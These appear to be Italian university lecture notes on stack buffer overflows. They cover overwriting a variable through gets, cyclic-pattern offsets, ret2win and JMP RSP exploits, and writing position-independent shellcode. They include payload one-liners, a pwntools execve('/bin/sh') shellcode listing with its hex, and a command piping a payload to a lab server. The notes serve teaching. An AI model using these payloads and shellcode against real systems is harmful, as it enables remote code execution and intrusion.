Lo stack memorizza variabili locali e altre informazioni associate alle chiamate di funzione. 
Lo stack inizia agli indirizzi più alti (0xfff...) e cresce verso il basso (0x000...) man mano che vengono chiamate più funzioni 

gets(buf) scrive l'input dell'utente da indirizzi inferiori a indirizzi superiori, a partire da buf, e poiché non esiste alcun controllo dei limiti, l'aggressore può sovrascrivere parti di memoria a indirizzi superiori a buf.

```c
char name[64] = "";
int magic = 0;
```

Si noti che sia `name[]` e `magic` sono definiti all'esterno della funzione, quindi si trovano entrambi nella parte statica della memoria. In C, la memoria statica viene riempita nell'ordine in cui vengono definite le variabili, quindi magic si trova a un indirizzo di memoria più alto rispetto a name (poiché la memoria statica cresce verso l'alto ed name è stata definita per prima, name si trova a un indirizzo di memoria più basso).

## bof-demo/bof-demo.c

La funzione gets() 
non dovrebbe mai essere usata. Come dice il manuale, il problema di gets è che riceve come input l’inizio di un buffer, ma non ha alcuna informazione sulla sua dimensione. Non esiste un modo di implementare gets in modo sicuro, perché l’utente controlla la quantità di dati forniti, e la funzione legge carattere per carattere finché non incontra una newline.

Se inviamo una stringa corta, tutto bene; se inviamo una stringa più lunga di 64 caratteri (in realtà 63, considerando il terminatore null delle stringhe C), allora otteniamo un overflow del buffer.

Dobbiamo chiederci come vengono allocate le variabili locali name e magic. Sappiamo che le variabili locali sono allocate sullo stack. Tuttavia, non sappiamo se in memoria name venga allocata a un indirizzo inferiore rispetto a magic, o viceversa.
E non importa l’ordine nel sorgente: il compilatore è libero di allocarle come vuole. Non esiste alcuna garanzia che una variabile dichiarata prima venga allocata prima, o viceversa.

Esistono due possibilità:

1. name è a un indirizzo inferiore: allora sovrascrivendo il buffer possiamo raggiungere magic.

2. name è a un indirizzo superiore: allora pur avendo un buffer overflow, non potremo mai sovrascrivere magic.

Dipende tutto dal layout effettivo deciso dal compilatore.

Supponiamo name è a un indirizzo più basso, e assumiamo anche che non ci sia padding tra name e magic. 
Ma se è così, allora inviando 64 byte e poi il valore coffee (in formato little endian), possiamo sovrascrivere magic.

```sh
python3 -c 'import os; os.write(1, b"a"*64 + b"\xee\xff\xc0\x00" + b"\n")' | ./bof-demo
```

Se inviamo più byte, otteniamo un **segmentation fault**.

Sul stack statico, oltre alle variabili locali, troviamo metadati, in particolare il saved return address (IP). Quindi se scriviamo abbastanza byte da oltrepassare name, magic e così via, arriveremo a sovrascrivere il return address.
E se al posto del return address mettiamo "AAAA", il programma tenterà di tornare a quell’indirizzo, causando un crash.

**cyclic pattern technique**
Per capire quanti byte sono necessari per sovrascrivere il return address, possiamo usare la tecnica del cyclic pattern.

```sh
pwn cyclic 200
```

Invio il cyclic pattern → crash → il valore del return address contiene una sottostringa del pattern 
→ cerco quella sottostringa 

```sh
pwn cyclic -l waaa
# output: 88
```
64 (name) + 4 (magic) + 12 (padding) + 8 (bp) = 88 byte
→ ricavo l’offset.

```sh
python3 -c "print('a'*88 + 'federico')"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafederico
```

→ sovrascrivo il return address con l’indirizzo di una funzione che voglio eseguire (ad esempio, la funzione magic).

La tecnica funziona nella maggior parte dei casi, ma non sempre: se il crash è causato dalla corruzione di altre variabili, la lettura del valore sullo stack non è affidabile.


## bof-demo/exploit6.py

Con questo programma sappiamo che 88 è il numero di byte necessari per raggiungere il saved return address. E sappiamo che all’interno del programma esiste una funzione win. E quella funzione win si trova a 0x0401166 
NOTA: il programma non è PI e la funzioen win si trova sempre a quell’indirizzo ed è stato trovate con objdump o ghidra.

Quindi possiamo far sì che il programma esegua quella funzione raggiungendo il saved return address e sostituendo il valore originale con l’indirizzo della funzione che vogliamo venga chiamata. Il codice è già lì.

Notare che il codice del programma stampa “I’m sorry, you lost”. Ma poi voi vincete. Perché?
Beh, se guardiamo il codice, il programma stampa “I’m sorry, you lost” perché la costante magic non è uguale a coffee: ora è AAAA, perché abbiamo sovrascritto tutto con ‘A’. Tuttavia, al ritorno da main, invece di ritornare a __libc.startMain — che normalmente è la funzione che chiama main — il programma ritorna alla funzione win. E quindi viene eseguito il codice della funzione win al suo posto. Quindi stampa “you win” e poi termina con successo.

Se la funzione non terminasse tramite exit, ma semplicemente ritornasse, probabilmente otterremmo un crash, perché non ci sarebbe un vero indirizzo valido nello stack su cui ritornare. Quella return molto probabilmente farebbe fallire il programma. Tuttavia, nella maggior parte dei casi non ci interessa.

 ## bof-demo/exploit7.py

[RSP.png]
Raramente è possibile conoscere la posizione esatta dello stack.
Sfruttiamo: ` JMP ESP/JMP RSP`

```sh
pip3 install ropper
ropper -f bof-demo --type jop --search '%rsp%' --quality 1
# oppure
objdump -d bof-demo | grep -i "jmp" ` 
  40127d:  ff e4   jmp    *%rsp
```

- Che significa: salta all’indirizzo contenuto nel registro ESP, cioè allo stack pointer, che in quel momento punterà proprio allo shellcode che hai inserito.

Anche se non conosci l’indirizzo dello stack, conosci l’indirizzo del codice del programma (o libreria) che contiene un’istruzione JMP ESP.
Quindi nel return address metti l’indirizzo dell’istruzione JMP ESP, non l’indirizzo dello shellcode.

Flusso:

- Overflow → sovrascrivi EIP con indirizzo di una JMP ESP già nel programma.
- La CPU esegue quella istruzione.
- La JMP ESP ti porta automaticamente nello stack, direttamente sullo shellcode.

Di solito gli shellcode sono soggetti a vincoli di dimensione e di byte ammessi.
Ad esempio, nel nostro caso c’era un byte che non potevamo usare nello shellcode. Sapete qual era?
La risposta comune sarebbe "il terminatore null", ma in questo caso gets accetta null byte. Qui il problema è il carattere newline. gets si ferma alla prima newline.
Quindi non possiamo inserire uno shellcode che contenga newline (tranne l’ultimo, ovviamente). Nulla nel mezzo può contenere una newline, perché al primo byte newline gets conclude l’input.

Per questo motivo gli shellcode sono generalmente scritti in assembly. E fortunatamente, negli scenari più comuni, potete usare shellcode già pronti scritti da altri: online e in Pwntools troviamo shellcode per praticamente ogni combinazione di architettura e OS. Tuttavia, voglio che comprendiate come funziona lo shellcode, e dovremo imparare anche a scriverne uno personalizzato, perché a volte quelli standard non funzionano, oppure esistono vincoli particolari che rendono necessario modificarli.

---

- L'istruzione jmp RSP è utile perché consente di eseguire il codice arbitrario già presente nello stack, senza dover conoscere esattamente dove si trova lo shellcode in memoria.


```sh
b'a' * OFFSET_RIP        # riempie il buffer e sovrascrive fino al RIP
+ p64(JMP_RSP)           # nuovo indirizzo di RIP + 1 (mi muovo in alto)
+ asm(shellcraft.sh())   # shellcode messo dopo il nuovo RIP
```

Nota: nell exploit7.py, lo shellcode viene genrata sul mio sistema locale. 

## sc-run/sc-run.c

La maggior parte dei sistemi operativi moderni ha una difesa chiamata DEP (Data Execution Prevention), che impedisce l'esecuzione di codice da aree di memoria che dovrebbero contenere solo dati (come un buffer di input).

Il codice che hai mostrato elude (bypassa) la DEP nel modo più esplicito possibile, richiedendo al sistema operativo un'area di memoria specificamente marcata come eseguibile (PROT_EXEC)


## Come spownare una shell

Allora, come possiamo generare una shell? In C potete usare chiamate di libreria. Per esempio, potete usare system. E con le system call potete usare fork e/o execv, e a volte usate anche fork, ma a volte non vi serve. In Windows avete ShellExecute, CreateProcess, o qualcosa del genere.

Ora, qual è il problema nell’usare una chiamata di libreria? Prima di tutto, non sapete se la libreria si trovi in memoria, perché state semplicemente iniettando del codice in un processo e non avete idea del layout di quel processo. Finora, nei miei esempi, ho usato processi in esecuzione sulla mia macchina, quindi potevo controllarne lo spazio degli indirizzi. Ma se pensate a un servizio che gira su una macchina remota, non avete alcuna idea dello spazio degli indirizzi della macchina remota. Quindi non potete sapere se e dove sia caricata la libc. Dunque dovreste invocare le system call, perché potete sempre invocare direttamente una system call, senza passare dal wrapper di libreria, naturalmente. E poi, come ho detto, dovreste scrivere codice position‑independent, perché, di nuovo, non controllate dove si trovi il buffer. Ogni volta che il programma gira, il buffer potrebbe trovarsi a un indirizzo diverso. Quindi, per far sì che lo shellcode funzioni in molti ambienti diversi, dovreste scrivere codice position‑independent e dovreste evitare alcuni valori particolari.

- Se il programma ha il buffer overflow a causa di una `strcpy` (o `strstpr`), allora il byte `0x00` è proibito.
- Se il buffer overflow è dovuto a `gets`, allora il byte `0x00` è ammesso, ma il newline (`0x0A`) non è consentito.
- Se il buffer overflow è causato da una system call `read`, tutti i byte sono ammessi, ma il payload è limitato alla quantità di byte letti (ad esempio, se legge solo 100 byte, il payload massimo è di 100 byte).
- Con `gets` puoi inviare una quantità arbitraria di dati, purché non contenga il byte `0x0A`.
- Con `scanf`, i caratteri proibiti possono includere spazi bianchi o altri caratteri specifici in base al formato utilizzato.

Inoltre, i byte che inviamo possono essere trasformati prima di essere eseguiti.
Esempio: se il programma legge il tuo nome e lo converte in uppercase prima del buffer overflow, allora i tuoi byte verranno trasformati nella versione maiuscola, e devi tenerne conto per generare la shellcode.


una volta che la shell viene creata.

1. Se si usa un comando come cut per inviare lo shellcode La shell viene creata e chiusa in un istante, e l'attaccante vede solo il programma vulnerabile terminare, dando l'impressione che lo shellcode non abbia funzionato.
Il trucco è forzare il comando che alimenta la pipe a non terminare, mantenendo così la pipe aperta e il canale stdin della shell attivo per la nostra interazione.

- cat my-shellcode - | vulnerable-prog


2. Quando stai sfruttando un servizio vulnerabile, quel servizio spesso ha i permessi di root (EUID = 0) perché deve svolgere funzioni a livello di sistema (ad esempio, un server web che gestisce le porte basse o un demone di sistema) ed EUID del processo vulnerabile: È root (0), perché il programma è un file SetUID root o è stato avviato da un processo genitore con privilegi.

Molte shell (in particolare /bin/sh o /bin/bash in configurazione standard, a meno che non vengano avviate con opzioni specifiche come -p o -V) sono programmate per essere sicure e prevenire l'abuso dei privilegi.

La shell capisce di essere stata eseguita con privilegi temporaneamente elevati (SetUID) e, per cautela, si auto-declassa ai privilegi dell'utente che l'ha chiamata.


## come effettuare le system call e di come scrivere codice position‑independent

Quindi, quando volete aprire un file, chiamate una funzione che si chiama open, che ha lo stesso nome della system call. L’implementazione di quel wrapper invocherà la system call con dell’assembly ad hoc.

Per Linux dobbiamo mettere il numero della system call in `EAX`
e gli argomenti, in quest’ordine, in 
`EBX`, `ECX`, `EDX`, `ESI`, `EDI` e `EBP`.

 Poi eseguire l’istruzione int 0x80, che è un software interrupt: una trap per il kernel che invocherà la system call. Al ritorno, EAX conterrà il valore di ritorno e tutti gli altri registri saranno preservati.


 ### sc-run/hello32.asm

Scrive "hello world" sulla console, possiamo usare il numero 4, che è la system call write
Compilare con 

```sh
nasm -f elf32 -o hello32-prog.o hello32.asm #assembled
ld -m elf_i386 -o hello32-prog hello32-prog.o #linked
```

NOTA: he INT 0x80 instruction has the binary opcode 11001101 10000000, which in hexadecimal becomes CD 80.

However

- ello32-prog is an ELF file, not shellcode
This issue can be solved easily; we can either generate raw code with nasm, by using -f bin, the default format
or extract the text section from the ELF:

```sh
objcopy --dump-section .text=hello32-text hello32-prog
```

- this code is NOT position-independent, as you can see with:

```sh
objdump -d -M intel hello32-prog
```

where

```asm
mov ecx, msg    ; use string "Hello World"
```

Ci sono però due cose che sono position‑independent: 

- i salti (jump) e le chiamate (call). 

Anche se la sintassi suggerisce il contrario — potete vedere “jump 100” e pensare “ok, 100 è un valore assoluto”: in realtà il processore codifica questa istruzione come distanza, negativa o positiva, dall’attuale instruction pointer all’indirizzo a cui vogliamo saltare o che vogliamo chiamare. Quindi le istruzioni jmp e call sono position‑independent. Inoltre, per definizione, ogni accesso allo stack dipende dal registro ESP, ma è normale non conoscere la posizione di ESP, quindi ogni volta usate semplicemente ESP più o meno un offset. Di conseguenza, anche quello è position‑independent.



### sc-run/hello32-call.asm

Ecco quindi un modo per rendere questo position‑independent; usiamo un trucco per ottenere l’indirizzo del messaggio: mettiamo il messaggio subito prima dell’istruzione call, e l’istruzione call che invochiamo è a quell’indirizzo. Sappiamo che call è codificata usando un offset, quindi è position‑independent. E cosa fa call? Spinge in cima allo stack l’indirizzo della prossima istruzione. Ma la prossima istruzione non deve per forza essere un’istruzione valida; in realtà call mette semplicemente l’instruction pointer in cima allo stack. Quindi, quando la CPU effettua il fetch di da call real_start dopo il fetch, l’instruction pointer è su msg:. L’istruzione call mette quel valore in cima allo stack e poi inizierà a eseguire real_start. Ma in cima allo stack abbiamo IP che punta a msg: 
; se facciamo pop di quel valore, otteniamo l’indirizzo del messaggio dentro ECX. Ed è così che otteniamo la position‑independence. È un trucco perché, ovviamente, stiamo “chiamando” qualcosa che non ritornerà. Di solito, se usate call per invocare una funzione, quella poi ritorna. Noi usiamo questo trucco solo per mettere l’indirizzo del messaggio in cima allo stack.

This assembly code can be:

- Assembled: `nasm hello32-call.asm`
- Injected: `./sc-run32 < hello32-call-sc`
- Debugged: `gdb sc-run32`, then: `run int3 < hello32-call-sc`

Alternatively, you can create an ELF program:

- Assembled: `nasm -f elf32 -o hello32-call.o hello32-call.asm`
- Linked: `ld -m elf_i386 -o hello32-prog hello32-call.o`
- Executed: `./hello32-prog`
- Debugged: `gdb hello32-prog`

And extract the shellcode later:

```sh
objcopy --dump-section .text=sc hello32-prog
```

### sc-run/sc-run32-stack.asm

Similarly, we can get a PIC shellcode by leveraging the stack:

- Assembled: `nasm -f elf32 -o hello32-stack.o hello32-stack.asm`
- Injected: `./sc-run32 < hello32-stack`


## in 64 bit

Non molto diverso. Il numero della system call va `RAX`, e gli argomenti vanno in
`RDI`, `RSI`, `RDX`, `R10`, `R8`, `R9`. Notate che i numeri delle system call sono diversi. Quindi, se volessi eseguire, per esempio, write in Linux a 64 bit, devo usare un numero diverso. Se ricordate, write a 32 bit era 4, mentre in Linux a 64 bit è 1, per esempio. 

L’ho già detto: non ho idea del perché abbiano cambiato i numeri, le system call sono le stesse. Quindi controllate il numero, impostate i parametri, e questa volta usate l’istruzione sys call invece di sollevare un software interrupt. Per il resto è lo stesso.  RCX e R11 sono preservati: non possono essere preservati perché l’istruzione di system call li usa per salvare l’IP e i flags. E questo è anche un trucco, talvolta, per ottenere l’instruction pointer.

This assembly code can be:

- assembled `nasm -f elf64 hello64.asm`
- Linked: `ld -m elf_x86_64 -o hello64 hello64.o`


- assembled `nasm hello64.asm -o hello64-pic`
- Injected: `./sc-run64 < hello64-pic`


## use REMOTE instead of LOCAL 

Nota divernte del porg: 
If you can escape that and run something in the real server, you can pass the exam with fine colors and unlock an achievement. But it's not so easy to. I mean, as far as I know, there is no way to do that. I used starting from Google to create a jail. But if you are up to a challenge, try to escape that challenge.

```sh
python3 -c 'import os; os.write(1, b"a"*64 + b"\xee\xff\xc0\x00" + b"\n")' | nc 192.168.20.1 5181
python3 exploit7.py REMOTE
```

Cosa c'è dentro Shellcraft.sh? Vediamo. Quindi da pound, importiamo star. Ok, ix context.binary è. Ora posso assegnare un file elf o semplicemente definire il nome del file elf aperto in modo da poterli assegnare. Questo è importante perché in questo modo, pound tools capisce che sto lavorando con un eseguibile x86 e così via. Quindi, quando richiedo del codice shell, mi fornirà un codice shell per x86 su una macchina a 64 bit. Lasciate che vi mostri questo. Se scrivo print shellcraft.sh, ottengo questo codice shell. Ma se non ho impostato il contesto, almeno importiamo gli strumenti pound, dovreste vedere che è simile, ma diverso. Quindi, ad esempio, qui imposta il registro RAX, che è disponibile solo in modalità a 64 bit, mentre in questo imposta EBX e così via. Quindi impostare il contesto è piuttosto importante.



```sh
python3

>>> from pwn import *
>>> context.binary='./bof-demo'
>>> print(shellcraft.sh())

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```

NOtare che se guarda l hex dell shellcode, non ci sono 00 and 0a bytes per evtare probemi noti di terminazione stringa e newline.

```sh
>>> enhex(asm(shellcraft.sh()))
6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
```

Salviamo lo shellcode per analizzarlo 

```sh
>>> shellcode=asm(shellcraft.sh())
>>> with open('spawn_sh', 'wb') as f:
>>> f.write(shellcode)
>>> f.close()
```

Debugghiamo 

```sh
ndisasm -b 64 spawn_sh
gdb ./sc-run64
run int3 < spawn_sh
```